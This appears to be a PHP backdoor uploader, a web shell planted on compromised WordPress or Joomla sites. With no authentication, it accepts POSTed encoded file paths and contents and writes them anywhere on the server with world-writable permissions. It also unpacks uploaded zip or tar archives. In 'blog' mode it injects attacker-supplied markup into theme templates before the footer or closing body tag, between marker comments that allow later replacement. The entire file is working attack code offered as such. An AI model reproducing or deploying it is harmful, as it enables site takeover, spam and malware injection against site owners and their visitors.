<?php

ini_set('error_reporting', E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

function hex2bin2($str) {
    $bin = "";
    $i = 0;
    do {
        $bin .= chr(hexdec($str[$i].$str[$i+1]));
        $i += 2;
    } while ($i < strlen($str));
    return $bin;
}


 function db_connect()
{
    global $db_path,$db_name, $db_login, $db_password, $connect;
    $connect = mysql_connect($db_path,$db_login,$db_password);
    if (!mysql_select_db($db_name))
        die (mysql_error()."<br>");
    return $connect;
}

if (!isset($_POST["path"])) die("Error: No path");
if (!isset($_POST["text"])) die("Error: No text");

$path = base64_decode(urldecode($_POST["path"]));
$text = hex2bin2(urldecode($_POST["text"]));

if ($_POST["isblog"]==1)
{
    $fpath = $path;
    //print $fpath."<br>";
    if (strpos($path,'wp-content'))
        $blog_type='w';
    else
        $blog_type='j';

    if (!is_file($fpath)) die("Error: No template file");
    @chmod($fpath,0777);
    $ftext=file_get_contents($fpath);
    if (!$ftext) die("Error: Cannot read template file");
    if ($blog_type=='j') $mark = '</body';
    else {
        if (strpos(strtolower($ftext),'<?php get_footer'))
            $mark = '<?php get_footer'; else $mark = '</body';
    };
    $posm = strpos(strtolower($ftext),$mark);
    if ($posm) $mark = substr($ftext,$posm,strlen($mark));
    //print '<br>Mark='.$mark.'</br>';

    $text = str_replace(chr(0),'',$text);
    //print $text;
    $bmark = '<!--#begin#-->';
    $emark = ' <!--#end#--> ';
    $pos1 = strpos(strtolower($ftext),$bmark);
    $pos2 = strpos(strtolower($ftext),$emark);
    //print $pos1.':'.$pos2;
    if (($pos1)&&($pos2))
        $ftext = substr_replace($ftext,'',$pos1,$pos2-$pos1+strlen($emark));
    $text = $bmark.$text.$emark.$mark;
    $ftext=str_replace($mark,$text,$ftext);
    //print $ftext;
    //unlink($fpath);
    $handle = @fopen($fpath, "w+");
    if (!$handle) die("Error: Cannot file open");
    if (fwrite($handle, $ftext)==false) {fclose($handle); die ("Error: Cannot file write");}
    fclose($handle);

    die("ok ");

}

$create = false;
if (!is_file($path)) $create = true;
if (!$create) @chmod($path,0777);
$handle = @fopen($path, "w");
if (!$handle) die("Error: Cannot file open and create");
if ($create) chmod($path,0777);

if (fwrite($handle, $text)==false) {fclose($handle); die ("Error: Cannot file write");}
fclose($handle);

if ($_POST["iszip"]==1)
{
    require_once('pclzip.lib.php');
    set_time_limit(1800);
    $zip = new PclZip($path);
    $list = $zip->extract(PCLZIP_OPT_SET_CHMOD, 0777);
    if ($list)
        print "zip unpacked. "; else die("Error: Cannot unpack archive");
    unlink($path);
    //print_r($list);
};

if ($_POST["iszip"]==2)
{
    require_once('tar.php');
    set_time_limit(1800);
    $zip = new Archive_Tar($path);
    $list = $zip->extract();
    if ($list)
        print "tar.gz unpacked. "; else die("Error: Cannot unpack tar.gz");
    unlink($path);
    //print_r($list);
};

print "ok";
